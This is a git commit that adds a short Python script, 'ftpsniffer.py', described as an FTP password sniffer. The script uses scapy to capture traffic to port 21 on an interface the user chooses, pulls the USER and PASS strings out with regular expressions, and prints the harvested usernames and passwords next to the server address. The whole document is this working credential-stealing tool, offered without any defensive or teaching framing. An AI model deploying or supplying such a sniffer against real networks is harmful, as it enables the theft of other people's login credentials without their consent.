126e3e8356d9413fc4163c4cc8836169333e8bda
glen-s-abraham <56243356+glen-s-abraham@users.noreply.github.com>
2019-12-09 01:45:11 -0500

    Add files via upload
    FTP password sniffer

---
+++ ftpsniffer.py
@@ -0,0 +1,19 @@
+import scapy.all as scapy
+import re
+def ftpSniff(pkt):
+	
+	if pkt.haslayer(scapy.TCP):
+		if pkt.getlayer(scapy.TCP).dport==21:
+			if not(pkt.getlayer(scapy.Raw)==None):
+				addr=str(pkt.getlayer(scapy.IP).dst)
+				text=str(pkt.getlayer(scapy.Raw))
+				user=re.findall("USER(.*)",text)
+				passw=re.findall("PASS(.*)",text)
+				print("FTP at "+addr)
+				print("User"+str(user))
+				print("Password"+str(passw))
+def main():
+	intrface=str(input("Enter interface to sniff"))
+	print("Starting sniffer on "+intrface)
+	scapy.sniff(iface=intrface,prn=ftpSniff)
+main()
